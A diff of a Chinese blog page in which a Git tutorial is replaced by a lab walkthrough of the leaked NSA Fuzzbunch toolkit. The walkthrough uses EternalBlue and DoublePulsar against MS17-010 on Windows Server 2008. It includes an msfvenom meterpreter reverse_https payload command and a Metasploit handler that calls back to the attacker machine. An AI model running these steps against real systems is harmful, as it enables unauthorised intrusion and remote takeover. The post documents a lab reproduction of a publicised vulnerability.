@@ -15,26 +15,40 @@
 
 
 
-<meta name="description" content="转载：感谢童仲毅同学写了该系列文章，我只是搬运工，谢谢!
-这是一篇在原文基础上演绎的译文。除非另行注明，页面上所有内容采用知识共享-署名(CC BY 2.5 AU)协议共享。
+<meta name="description" content="介绍
+影子经纪人（Shadow Brokers）最近陆续曝光的NSA网络武器令人震惊，尽管这些工具是否出自国家级别黑客团队之手尚不清楚，但至少存在一个可以说明问题的事实：这些漏洞利用工具都能有效运行，且具有一定程度的威胁杀伤力。在此，我用NSA的两个大杀器演示对Win 7和Windows  Server 2008系统进行漏洞利用和入侵控制的过程复现。
 
-git statusgit status命令显示工作目录和缓存区的状态。你可以看到哪些更改被缓存了，哪些还没有，以及哪些还未被Git追踪。status的输出 不会 告诉你任何已提交到项目历史的信息。如果你想看的话，应该使用">
+本次shadowbroker放出的工具影响情">
 <meta property="og:type" content="article">
-<meta property="og:title" content="4_Git之检查仓库状态">
-<meta property="og:url" content="http://r00to1.github.io/2015/01/27/4_Git/index.html">
+<meta property="og:title" content="NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵">
+<meta property="og:url" content="http://r00to1.github.io/2017/04/23/NSA-MS17-010/index.html">
 <meta property="og:site_name" content="HawSkull's Blog">
-<meta property="og:description" content="转载：感谢童仲毅同学写了该系列文章，我只是搬运工，谢谢!
-这是一篇在原文基础上演绎的译文。除非另行注明，页面上所有内容采用知识共享-署名(CC BY 2.5 AU)协议共享。
+<meta property="og:description" content="介绍
+影子经纪人（Shadow Brokers）最近陆续曝光的NSA网络武器令人震惊，尽管这些工具是否出自国家级别黑客团队之手尚不清楚，但至少存在一个可以说明问题的事实：这些漏洞利用工具都能有效运行，且具有一定程度的威胁杀伤力。在此，我用NSA的两个大杀器演示对Win 7和Windows  Server 2008系统进行漏洞利用和入侵控制的过程复现。
 
-git statusgit status命令显示工作目录和缓存区的状态。你可以看到哪些更改被缓存了，哪些还没有，以及哪些还未被Git追踪。status的输出 不会 告诉你任何已提交到项目历史的信息。如果你想看的话，应该使用">
-<meta property="og:image" content="https://www.atlassian.com/git/images/tutorials/getting-started/inspecting-a-repository/01.svg">
-<meta property="og:updated_time" content="2015-01-29T11:15:39.000Z">
+本次shadowbroker放出的工具影响情">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/2.jpg">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/3.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/5.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/4.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/6.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/7.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/8.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/9.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/10.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/11.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/12.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/21.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/13.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/14.png">
+<meta property="og:image" content="http://r00to1.github.io/images/nsa/22.png">
+<meta property="og:updated_time" content="2017-04-23T04:07:32.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="4_Git之检查仓库状态">
-<meta name="twitter:description" content="转载：感谢童仲毅同学写了该系列文章，我只是搬运工，谢谢!
-这是一篇在原文基础上演绎的译文。除非另行注明，页面上所有内容采用知识共享-署名(CC BY 2.5 AU)协议共享。
+<meta name="twitter:title" content="NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵">
+<meta name="twitter:description" content="介绍
+影子经纪人（Shadow Brokers）最近陆续曝光的NSA网络武器令人震惊，尽管这些工具是否出自国家级别黑客团队之手尚不清楚，但至少存在一个可以说明问题的事实：这些漏洞利用工具都能有效运行，且具有一定程度的威胁杀伤力。在此，我用NSA的两个大杀器演示对Win 7和Windows  Server 2008系统进行漏洞利用和入侵控制的过程复现。
 
-git statusgit status命令显示工作目录和缓存区的状态。你可以看到哪些更改被缓存了，哪些还没有，以及哪些还未被Git追踪。status的输出 不会 告诉你任何已提交到项目历史的信息。如果你想看的话，应该使用">
+本次shadowbroker放出的工具影响情">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -66,7 +80,7 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>4_Git之检查仓库状态 | HawSkull&#39;s Blog</title>
+<title>NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵 | HawSkull&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -321,11 +335,11 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-4_Git" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-NSA-MS17-010" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/01/27/4_Git/" class="article-date">
-      <time datetime="2015-01-27T05:15:39.000Z" itemprop="datePublished">2015-01-27</time>
+      <a href="/2017/04/23/NSA-MS17-010/" class="article-date">
+      <time datetime="2017-04-23T04:07:32.000Z" itemprop="datePublished">2017-04-23</time>
 </a>
 
 
@@ -340,7 +354,7 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
         
   
     <h1 class="article-title" itemprop="name">
-      4_Git之检查仓库状态
+      NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵
     </h1>
   
 
@@ -357,57 +371,82 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
     <div class="article-entry" itemprop="articleBody">
       
           
-        <hr>
-<blockquote>
-<p>转载：感谢<a href="https://github.com/geeeeeeeeek" target="_blank" rel="external">童仲毅</a>同学写了该系列文章，我只是搬运工，谢谢!</p>
-<p>这是一篇在<a href="https://www.atlassian.com/git/tutorials/inspecting-a-repository/git-log" target="_blank" rel="external">原文</a>基础上演绎的译文。除非另行注明，页面上所有内容采用知识共享-署名(<a href="http://creativecommons.org/licenses/by/2.5/au/deed.zh" target="_blank" rel="external">CC BY 2.5 AU</a>)协议共享。</p>
+        <h2 id="介绍">介绍</h2><blockquote>
+<p>影子经纪人（Shadow Brokers）最近陆续曝光的NSA网络武器令人震惊，尽管这些工具是否出自国家级别黑客团队之手尚不清楚，但至少存在一个可以说明问题的事实：这些漏洞利用工具都能有效运行，且具有一定程度的威胁杀伤力。在此，我用NSA的两个大杀器演示对Win 7和Windows  Server 2008系统进行漏洞利用和入侵控制的过程复现。</p>
 </blockquote>
-<h2 id="git_status">git status</h2><p><code>git status</code>命令显示工作目录和缓存区的状态。你可以看到哪些更改被缓存了，哪些还没有，以及哪些还未被Git追踪。status的输出 <em>不会</em> 告诉你任何已提交到项目历史的信息。如果你想看的话，应该使用<code>git log</code>命令。</p>
-<h3 id="用法">用法</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">status</span></span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>列出已缓存、未缓存、未追踪的文件。</p>
-<h3 id="讨论">讨论</h3><p><code>git status</code>是一个相对简单的命令。 它告诉你<code>git add</code>和<code>git commit</code>的进展。status信息还包括了添加缓存和移除缓存的相关指令。样例输出显示了三类主要的<code>git status</code>输出：</p>
-<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># On branch master</span></span><br><span class="line"><span class="preprocessor"># Changes to be committed:</span></span><br><span class="line"><span class="preprocessor"># (use "git reset HEAD &lt;file&gt;..." to unstage)</span></span><br><span class="line"><span class="preprocessor">#</span></span><br><span class="line"><span class="preprocessor">#modified: hello.py</span></span><br><span class="line"><span class="preprocessor">#</span></span><br><span class="line"><span class="preprocessor"># Changes not staged for commit:</span></span><br><span class="line"><span class="preprocessor"># (use "git add &lt;file&gt;..." to update what will be committed)</span></span><br><span class="line"><span class="preprocessor"># (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)</span></span><br><span class="line"><span class="preprocessor">#</span></span><br><span class="line"><span class="preprocessor">#modified: main.py</span></span><br><span class="line"><span class="preprocessor">#</span></span><br><span class="line"><span class="preprocessor"># Untracked files:</span></span><br><span class="line"><span class="preprocessor"># (use "git add &lt;file&gt;..." to include in what will be committed)</span></span><br><span class="line"><span class="preprocessor">#</span></span><br><span class="line"><span class="preprocessor">#hello.pyc</span></span><br></pre></td></tr></table></figure>
-<h4 id="忽略文件">忽略文件</h4><p>未追踪的文件通常有两类。它们要么是项目新增但还未提交的文件，要么是像<code>.pyc</code> <code>.obj</code>  <code>.exe</code>等编译后的二进制文件。显然前者应该出现在<code>git status</code>的输出中，而后者会让我们困惑究竟发生了什么。</p>
-<p>因此，Git允许你完全忽略这些文件，只需要将路径放在一个特定的<code>.gitignore</code>文件中。所有想要忽略的文件应该分别写在单独一行，*字符用作通配符。比如，将下面这行加入项目根目录的<code>.gitignore</code>文件可以避免编译后的Python模块出现在<code>git status</code>中：</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="class">.pyc</span></span><br></pre></td></tr></table></figure>
-<h3 id="栗子">栗子</h3><p>在提交更改前检查仓库状态是一个良好的实践，这样你就不会不小心提交什么奇怪的东西。这个例子显示了缓存和提交快照前后的仓库状态：</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Edit hello.<span class="keyword">py</span></span><br><span class="line">git status</span><br><span class="line"># hello.<span class="keyword">py</span> <span class="keyword">is</span> listed under <span class="string">"Changes not staged for commit"</span></span><br><span class="line">git <span class="built_in">add</span> hello.<span class="keyword">py</span></span><br><span class="line">git status</span><br><span class="line"># hello.<span class="keyword">py</span> <span class="keyword">is</span> listed under <span class="string">"Changes to be committed"</span></span><br><span class="line">git commit</span><br><span class="line">git status</span><br><span class="line"># nothing <span class="keyword">to</span> commit (working directory clean)</span><br></pre></td></tr></table></figure>
-<p>第一个status的输出显示文件还未缓存。<code>git add</code>操作会影响第二个<code>git status</code>，最后的status输出告诉你已经没有可以提交的东西了——工作目录和最近的提交一致。一些Git命令（比如<code>git merge</code>）需要工作目录整洁，以免意外覆盖更改。</p>
-<h2 id="git_log">git log</h2><p><code>git log</code> 命令显示已提交的快照。你可以列出项目历史，筛选，以及搜索特定更改。<code>git status</code> 允许你查看工作目录和缓存区，而<code>git log</code>只作用于提交的项目历史。</p>
-<p><img src="https://www.atlassian.com/git/images/tutorials/getting-started/inspecting-a-repository/01.svg" alt="Git Tutorial: git status vs. git log"></p>
-<p>log输出可以有很多种自定义的方式，从简单地筛选提交，到用完全自定义的格式显示。其中一些最常用的<code>git log</code>配置如下所示。</p>
-<h3 id="用法-1">用法</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span></span><br></pre></td></tr></table></figure>
-<p>使用默认格式显示完整地项目历史。如果输出超过一屏，你可以用<code>空格键</code>来滚动，按<code>q</code>退出。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> -n &lt;<span class="built_in">limit</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>用<code>&lt;limit&gt;</code>限制提交的数量。比如<code>git log -n 3</code>只会显示3个提交。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> <span class="comment">--oneline</span></span><br></pre></td></tr></table></figure>
-<p>将每个提交压缩到一行。当你需要查看项目历史的上层情况时这会很有用。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> <span class="comment">--stat</span></span><br></pre></td></tr></table></figure>
-<p>除了<code>git log</code>信息之外，包含哪些文件被更改了，以及每个文件相对的增删行数。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> -p</span><br></pre></td></tr></table></figure>
-<p>显示代表每个提交的一堆信息。显示每个提交全部的差异(diff)，这也是项目历史中最详细的视图。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> <span class="comment">--author="&lt;pattern&gt;"</span></span><br></pre></td></tr></table></figure>
-<p>搜索特定作者的提交。<code>&lt;pattern&gt;</code>可以是字符串或正则表达式。</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">log</span> --<span class="keyword">grep</span>=<span class="string">"&lt;pattern&gt;"</span></span><br></pre></td></tr></table></figure>
-<p>搜索提交信息匹配特定<code>&lt;pattern&gt;</code>的提交。<code>&lt;pattern&gt;</code>可以是字符串或正则表达式。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> &lt;<span class="keyword">since</span>&gt;..&lt;<span class="keyword">until</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>只显示发生在<code>&lt;since&gt;</code>和<code>&lt;until&gt;</code>之间的提交。两个参数可以是提交ID、分支名、<code>HEAD</code>或是任何一种引用。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> &lt;<span class="type">file</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>只显示包含特定文件的提交。查找特定文件的历史这样做会很方便。</p>
-<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">git</span> <span class="comment">log</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">graph</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">decorate</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">oneline</span></span><br></pre></td></tr></table></figure>
-<p>还有一些有用的选项。<code>--graph</code>标记会绘制一幅字符组成的图形，左边是提交，右边是提交信息。<code>--decorate</code>标记会加上提交所在的分支名称和标签。<code>--oneline</code>标记将提交信息显示在同一行，一目了然。</p>
-<h3 id="讨论-1">讨论</h3><p><code>git log</code>命令是Git查看项目历史的基本工具。当你要寻找项目特定的一个版本或者弄明白合并功能分支时引入了哪些变化，你就会用到这个命令。</p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commit 3157ee<span class="number">3718e180a94</span>76bf2e5cab<span class="number">8e3f1e78</span>a73b7</span><br><span class="line">Author: John Smith</span><br></pre></td></tr></table></figure>
-<p>大多数时候都很简单直接。但是，第一行需要解释下。<code>commit</code>后面40个字的字符串是提交内容的SHA-1校验总和(checksum)。它有两个作用。一是保证提交的正确性——如果它被损坏了，提交会生成一个不同的校验总和。第二，它是提交唯一的标识ID。</p>
-<p>这个ID可以用于<code>git log ..</code>这样的命令中来引用具体的提交。比如，<code>git log 3157e..5ab91</code>会显示所有ID在 <code>3157e</code>和<code>5ab91</code>之间的提交。除了校验总和之外，分支名、HEAD关键字也是常用的引用提交的方法。<code>HEAD</code>总是指向当前的提交，无论是分支还是特定提交也好。</p>
-<p>~字符用于表示提交的父节点的相对引用。比如，<code>3157e~1</code>指向<code>3157e</code>前一个提交,<code>HEAD~3</code>是当前提交的回溯3个节点的提交。</p>
-<p>所有这些标识方法的背后都是为了让你对特定提交进行操作。<code>git log</code>命令一般是这些交互的起点，因为它让你找到你想要的提交。</p>
-<h3 id="栗子-1">栗子</h3><p><em>用法</em> 一节提供了<code>git log</code>很多的栗子，但请记住，你可以将很多选项用在同一个命令中：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --author=<span class="string">"John Smith"</span> -<span class="tag">p</span> hello.py</span><br></pre></td></tr></table></figure>
-<p>这个命令会显示<code>John Smith</code>作者对<code>hello.py</code>文件所做的所有更改的差异比较(diff)。</p>
-<p>..句法是比较分支很有用的工具。下面的栗子显示了在<code>some-feature</code>分支而不在<code>master</code>分支的所有提交的概览。</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> <span class="comment">--oneline master..some-feature</span></span><br></pre></td></tr></table></figure>
+<p>本次shadowbroker放出的工具影响情况如下：<br><img src="/images/nsa/2.jpg" alt="图片"></p>
+<h2 id="工具说明">工具说明</h2><h3 id="框架地址">框架地址</h3><p>附上框架条件的连接<a href="https://www.python.org/download/releases/2.6/" target="_blank" rel="external">Python 2.6</a>和老版本的<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/" target="_blank" rel="external">PyWin32</a> v2.12</p>
+<h3 id="整体目录介绍">整体目录介绍</h3><p>下载并且解压 <a href="https://github.com/x0rz/EQGRP_Lost_in_Translation" target="_blank" rel="external">EQGRP_Lost_in_Translation-master.zip</a>,总共包含三个目录：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">windows</span>目录针对Windows操作系统的利用工具和相关攻击代码；</span><br><span class="line"></span><br><span class="line"><span class="keyword">swift目录中是包含入侵swift银行系统的操作记录等相关证据；</span><br><span class="line"></span></span><br><span class="line"><span class="label">oddjob</span>目录是后门Rootkit等相关文档；</span><br></pre></td></tr></table></figure>
+<p><img src="/images/nsa/3.png" alt="图片"></p>
+<p>这里我们主要使用windows目录中的工具进行攻击.</p>
+<p>搭建好环境,直接运行<code>python fb.py</code>即可,请根据报错内容新建文件夹或者注释代码.</p>
+<p>在windows目录中新建<code>listeningposts</code>文件夹即可.</p>
+<p>另外修改相同目录下找到Fuzzbunch.xml文件，用我们本地系统相关路径把其中的第19行和第24行路径进行覆盖，如下图所示：</p>
+<p><img src="/images/nsa/5.png" alt="图片"></p>
+<p>至此,攻击工具已经完成设置:</p>
+<p><img src="/images/nsa/4.png" alt="图片"></p>
+<hr>
+<h2 id="利用MS17-010漏洞攻击Win_7和Win_Server_2008">利用MS17-010漏洞攻击Win 7和Win Server 2008</h2><h3 id="环境设置">环境设置</h3><table>
+<thead>
+<tr>
+<th style="text-align:left">IP</th>
+<th style="text-align:left">SYSTEM</th>
+<th style="text-align:left">用途</th>
+<th style="text-align:left">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">192.168.75.70</td>
+<td style="text-align:left">Windows Server 2003 SP2</td>
+<td style="text-align:left">攻击机，安装了Fuzzbunch</td>
+<td style="text-align:left">x86架构，需安装python2.6.6 x86版本及pywin32对应版本</td>
+</tr>
+<tr>
+<td style="text-align:left">192.168.75.71</td>
+<td style="text-align:left">Kali2</td>
+<td style="text-align:left">生成回连payload并控制回连会话</td>
+<td style="text-align:left">生成dll文件</td>
+</tr>
+<tr>
+<td style="text-align:left">192.168.75.41</td>
+<td style="text-align:left">Windows Server 2008 R2</td>
+<td style="text-align:left">靶机</td>
+<td style="text-align:left">64位架构，局域网服务器，开放了指定端口及服务</td>
+</tr>
+</tbody>
+</table>
+<h3 id="预输入攻击目标">预输入攻击目标</h3><p><img src="/images/nsa/6.png" alt="图片"></p>
+<h3 id="利用Smbtouch判断可用漏洞">利用Smbtouch判断可用漏洞</h3><p>使用命令：use Smbtouch </p>
+<p>执行命令：execute</p>
+<p>如图输入:</p>
+<p><img src="/images/nsa/7.png" alt="图片"></p>
+<p>结果如图所示,可以使用:</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[Vulnerable]</span></span><br><span class="line">ETERNALBLUE     - DANE</span><br><span class="line">ETERNALROMANCE  - FB</span><br><span class="line">ETERNALCHAMPION - DANE/FB</span><br></pre></td></tr></table></figure>
+<p><img src="/images/nsa/8.png" alt="图片"></p>
+<h3 id="使用ETERNALBLUE攻击">使用ETERNALBLUE攻击</h3><p>我们在FUZZBUNCH终端上用命令<code>use EternalBlue</code>选择使用<code>EternalBlue</code>作为漏洞利用工具：</p>
+<p><img src="/images/nsa/9.png" alt="图片"></p>
+<p>工具会自动载入预设值.</p>
+<p>经过一系列预设之后,我们选择模式1:</p>
+<p><img src="/images/nsa/10.png" alt="图片"></p>
+<p>最后，对目标系统运行EternalBlue之后，成功返回<code>Eternalblue Succeeded</code>.</p>
+<p><img src="/images/nsa/11.png" alt="图片"></p>
+<p>目前为止,已经在靶机系统利用EternalBlue成功植入后门,可以利用批量检测工具来检测下:</p>
+<p><img src="/images/nsa/12.png" alt="图片"></p>
+<h3 id="使用msfvenom生成恶意DLL文件">使用msfvenom生成恶意DLL文件</h3><p>登陆kali2 使用:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~<span class="preprocessor"># msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.75</span><span class="number">.71</span> LPORT=<span class="number">4446</span> -f dll &gt;<span class="number">64</span>httpswin.dll</span></span><br></pre></td></tr></table></figure>
+<p>这里要根据目标的情况选择相应的回连方式,最后将生成的payload <code>64httpswin.dll</code>放到攻击机<code>192.168.75.70</code>上的D盘(可以任意位置)</p>
+<h3 id="Meterpreter中反弹连接">Meterpreter中反弹连接</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt; set payload windows/x64/meterpreter/reverse_https </span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_https</span><br><span class="line">msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt; set lhost <span class="number">192.168</span>.<span class="number">75.71</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">75.71</span></span><br><span class="line">msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt; set lport <span class="number">4446</span></span><br><span class="line">lport =&gt; <span class="number">4446</span></span><br><span class="line">msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https:<span class="comment">//192.168.75.71:4446</span></span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
+<p><img src="/images/nsa/21.png" alt="图片"></p>
+<h3 id="使用DoublePulsar向目标系统中注入Payload文件">使用DoublePulsar向目标系统中注入Payload文件</h3><p>在FUZZBUNCH终端使用<code>use DoublePulsar</code>命令运行<code>DoublePulsar</code>：</p>
+<p>一路默认设置之后,注意以下需要手工配置的地方:</p>
+<p><img src="/images/nsa/13.png" alt="图片"></p>
+<p>开始执行远程注入,返回成功:</p>
+<p><img src="/images/nsa/14.png" alt="图片"></p>
+<p>返回kali2,查看已经有回话返回:</p>
+<p><img src="/images/nsa/22.png" alt="图片"></p>
+<p>至此,拿下远程主机shell.</p>
 
       
     </div>
@@ -416,13 +455,13 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2015/01/27/4_Git/">4_Git之检查仓库状态</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/23/NSA-MS17-010/">NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">哈哈髅</a></p>
-        <p><span>发布时间:</span>2015-01-27, 13:15:39</p>
-        <p><span>最后更新:</span>2015-01-29, 19:15:39</p>
+        <p><span>发布时间:</span>2017-04-23, 12:07:32</p>
+        <p><span>最后更新:</span>2017-04-23, 12:07:32</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2015/01/27/4_Git/" title="4_Git之检查仓库状态">http://r00to1.github.io/2015/01/27/4_Git/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://r00to1.github.io/2015/01/27/4_Git/　　作者: 哈哈髅" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/23/NSA-MS17-010/" title="NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵">http://r00to1.github.io/2017/04/23/NSA-MS17-010/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://r00to1.github.io/2017/04/23/NSA-MS17-010/　　作者: 哈哈髅" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -434,16 +473,10 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2015/01/28/3_Git/">
-                    3_Git之保存你的更改
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2015/01/26/5_Git/">
-                    5_Git之图解Git命令
+                <a href="/2017/02/09/ossim_win_ossec_4771/">
+                    详解OSSIM-OSSEC WIN 4771 案例
                 </a>
             </div>
         
@@ -563,7 +596,7 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#git_status"><span class="toc-number">1.</span> <span class="toc-text">git status</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#用法"><span class="toc-number">1.1.</span> <span class="toc-text">用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#讨论"><span class="toc-number">1.2.</span> <span class="toc-text">讨论</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#忽略文件"><span class="toc-number">1.2.1.</span> <span class="toc-text">忽略文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#栗子"><span class="toc-number">1.3.</span> <span class="toc-text">栗子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#git_log"><span class="toc-number">2.</span> <span class="toc-text">git log</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#用法-1"><span class="toc-number">2.1.</span> <span class="toc-text">用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#讨论-1"><span class="toc-number">2.2.</span> <span class="toc-text">讨论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#栗子-1"><span class="toc-number">2.3.</span> <span class="toc-text">栗子</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具说明"><span class="toc-number">2.</span> <span class="toc-text">工具说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#框架地址"><span class="toc-number">2.1.</span> <span class="toc-text">框架地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#整体目录介绍"><span class="toc-number">2.2.</span> <span class="toc-text">整体目录介绍</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用MS17-010漏洞攻击Win_7和Win_Server_2008"><span class="toc-number">3.</span> <span class="toc-text">利用MS17-010漏洞攻击Win 7和Win Server 2008</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境设置"><span class="toc-number">3.1.</span> <span class="toc-text">环境设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预输入攻击目标"><span class="toc-number">3.2.</span> <span class="toc-text">预输入攻击目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Smbtouch判断可用漏洞"><span class="toc-number">3.3.</span> <span class="toc-text">利用Smbtouch判断可用漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用ETERNALBLUE攻击"><span class="toc-number">3.4.</span> <span 